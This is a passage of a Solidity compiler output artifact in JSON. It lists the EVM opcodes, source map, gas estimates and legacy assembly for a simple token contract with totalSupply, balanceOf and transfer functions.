							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x18160DDD EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x94 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0xC4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x2E6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x79 SWAP2 SWAP1 PUSH2 0x248 JUMP JUMPDEST PUSH2 0xCA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8B SWAP2 SWAP1 PUSH2 0x2E6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAE PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x271 JUMP JUMPDEST PUSH2 0x112 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xBB SWAP2 SWAP1 PUSH2 0x2CB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x15F SWAP2 SWAP1 PUSH2 0x357 JUMP JUMPDEST LT ISZERO PUSH2 0x16A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x1B8 SWAP2 SWAP1 PUSH2 0x357 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x20D SWAP2 SWAP1 PUSH2 0x301 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x22D DUP2 PUSH2 0x402 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x242 DUP2 PUSH2 0x419 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x25A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x268 DUP5 DUP3 DUP6 ADD PUSH2 0x21E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x284 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x292 DUP6 DUP3 DUP7 ADD PUSH2 0x21E JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x2A3 DUP6 DUP3 DUP7 ADD PUSH2 0x233 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x2B6 DUP2 PUSH2 0x39D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x2C5 DUP2 PUSH2 0x3C9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2E0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2AD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2FB PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2BC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x30C DUP3 PUSH2 0x3C9 JUMP JUMPDEST SWAP2 POP PUSH2 0x317 DUP4 PUSH2 0x3C9 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x34C JUMPI PUSH2 0x34B PUSH2 0x3D3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x362 DUP3 PUSH2 0x3C9 JUMP JUMPDEST SWAP2 POP PUSH2 0x36D DUP4 PUSH2 0x3C9 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x380 JUMPI PUSH2 0x37F PUSH2 0x3D3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x396 DUP3 PUSH2 0x3A9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x40B DUP2 PUSH2 0x38B JUMP JUMPDEST DUP2 EQ PUSH2 0x416 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x422 DUP2 PUSH2 0x3C9 JUMP JUMPDEST DUP2 EQ PUSH2 0x42D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x2C PUSH27 0x7A3B801135E796914B927415438ED61C53FB783151F063675B5379 PUSH22 0xD11564736F6C63430008010033000000000000000000 ",
							"sourceMap": "60:522:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;120:23;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;473:106;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;260:207;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;120:23;;;;:::o;473:106::-;529:12;557:8;:16;566:6;557:16;;;;;;;;;;;;;;;;550:23;;473:106;;;:::o;260:207::-;320:4;374:1;364:6;341:8;:20;350:10;341:20;;;;;;;;;;;;;;;;:29;;;;:::i;:::-;:34;;333:43;;;;;;407:6;383:8;:20;392:10;383:20;;;;;;;;;;;;;;;;:30;;;;;;;:::i;:::-;;;;;;;;437:6;420:8;:13;429:3;420:13;;;;;;;;;;;;;;;;:23;;;;;;;:::i;:::-;;;;;;;;457:4;450:11;;260:207;;;;:::o;7:139:2:-;;91:6;78:20;69:29;;107:33;134:5;107:33;:::i;:::-;59:87;;;;:::o;152:139::-;;236:6;223:20;214:29;;252:33;279:5;252:33;:::i;:::-;204:87;;;;:::o;297:262::-;;405:2;393:9;384:7;380:23;376:32;373:2;;;421:1;418;411:12;373:2;464:1;489:53;534:7;525:6;514:9;510:22;489:53;:::i;:::-;479:63;;435:117;363:196;;;;:::o;565:407::-;;;690:2;678:9;669:7;665:23;661:32;658:2;;;706:1;703;696:12;658:2;749:1;774:53;819:7;810:6;799:9;795:22;774:53;:::i;:::-;764:63;;720:117;876:2;902:53;947:7;938:6;927:9;923:22;902:53;:::i;:::-;892:63;;847:118;648:324;;;;;:::o;978:109::-;1059:21;1074:5;1059:21;:::i;:::-;1054:3;1047:34;1037:50;;:::o;1093:118::-;1180:24;1198:5;1180:24;:::i;:::-;1175:3;1168:37;1158:53;;:::o;1217:210::-;;1342:2;1331:9;1327:18;1319:26;;1355:65;1417:1;1406:9;1402:17;1393:6;1355:65;:::i;:::-;1309:118;;;;:::o;1433:222::-;;1564:2;1553:9;1549:18;1541:26;;1577:71;1645:1;1634:9;1630:17;1621:6;1577:71;:::i;:::-;1531:124;;;;:::o;1661:305::-;;1720:20;1738:1;1720:20;:::i;:::-;1715:25;;1754:20;1772:1;1754:20;:::i;:::-;1749:25;;1908:1;1840:66;1836:74;1833:1;1830:81;1827:2;;;1914:18;;:::i;:::-;1827:2;1958:1;1955;1951:9;1944:16;;1705:261;;;;:::o;1972:191::-;;2032:20;2050:1;2032:20;:::i;:::-;2027:25;;2066:20;2084:1;2066:20;:::i;:::-;2061:25;;2105:1;2102;2099:8;2096:2;;;2110:18;;:::i;:::-;2096:2;2155:1;2152;2148:9;2140:17;;2017:146;;;;:::o;2169:96::-;;2235:24;2253:5;2235:24;:::i;:::-;2224:35;;2214:51;;;:::o;2271:90::-;;2348:5;2341:13;2334:21;2323:32;;2313:48;;;:::o;2367:126::-;;2444:42;2437:5;2433:54;2422:65;;2412:81;;;:::o;2499:77::-;;2565:5;2554:16;;2544:32;;;:::o;2582:180::-;2630:77;2627:1;2620:88;2727:4;2724:1;2717:15;2751:4;2748:1;2741:15;2768:122;2841:24;2859:5;2841:24;:::i;:::-;2834:5;2831:35;2821:2;;2880:1;2877;2870:12;2821:2;2811:79;:::o;2896:122::-;2969:24;2987:5;2969:24;:::i;:::-;2962:5;2959:35;2949:2;;3008:1;3005;2998:12;2949:2;2939:79;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "225200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"balanceOf(address)": "1541",
								"totalSupply()": "1107",
								"transfer(address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 582,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 150,
									"end": 254,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 234,
									"end": 248,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 220,
									"end": 231,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 220,
									"end": 248,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 220,
									"end": 248,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 220,
									"end": 248,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 197,
									"end": 205,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 197,
									"end": 217,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 206,
									"end": 216,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 197,
									"end": 217,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 197,
									"end": 217,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 197,
									"end": 217,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 197,
									"end": 217,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 197,
									"end": 217,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 197,
									"end": 217,
									"name": "KECCAK256",
									"source": 0
								},
								{
									"begin": 197,
									"end": 248,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 197,
									"end": 248,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 197,
									"end": 248,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 197,
									"end": 248,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 150,
									"end": 254,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 582,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 7,
									"end": 150,
									"name": "tag",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 7,
									"end": 150,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 7,
									"end": 150,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 95,
									"end": 101,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 89,
									"end": 102,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 138,
									"end": 143,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "tag",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "tag",
									"source": 2,
									"value": "3"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 156,
									"end": 440,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 275,
									"end": 277,
									"name": "PUSH",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 263,
									"end": 272,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 254,
									"end": 261,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 250,
									"end": 273,
									"name": "SUB",
									"source": 2
								},
								{
									"begin": 246,
									"end": 278,
									"name": "SLT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "ISZERO",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 291,
									"end": 292,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 288,
									"end": 289,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 281,
									"end": 293,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "tag",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 334,
									"end": 335,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 415,
									"end": 422,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 406,
									"end": 412,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 395,
									"end": 404,
									"name": "DUP6",
									"source": 2
								},
								{
									"begin": 391,
									"end": 413,
									"name": "ADD",
									"source": 2
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "tag",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 305,
									"end": 433,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 446,
									"end": 523,
									"name": "tag",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 446,
									"end": 523,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 446,
									"end": 523,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 512,
									"end": 517,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 501,
									"end": 517,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 501,
									"end": 517,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 523,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 491,
									"end": 523,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 491,
									"end": 523,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 523,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 529,
									"end": 651,
									"name": "tag",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 529,
									"end": 651,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 602,
									"end": 626,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 620,
									"end": 625,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 602,
									"end": 626,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 602,
									"end": 626,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 602,
									"end": 626,
									"name": "tag",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 602,
									"end": 626,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 595,
									"end": 600,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 592,
									"end": 627,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 582,
									"end": 584,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "19"
								},
								{
									"begin": 582,
									"end": 584,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 641,
									"end": 642,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 638,
									"end": 639,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 631,
									"end": 643,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 582,
									"end": 584,
									"name": "tag",
									"source": 2,
									"value": "19"
								},
								{
									"begin": 582,
									"end": 584,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 572,
									"end": 651,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 572,
									"end": 651,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 60,
									"end": 582,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 582,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 582,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 582,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212202c7a7a3b801135e796914b927415438ed61c53fb783151f063675b537975d11564736f6c63430008010033",
									".code": [
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "18160DDD"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH",
											"source": 0,
											"value": "70A08231"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 582,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 582,
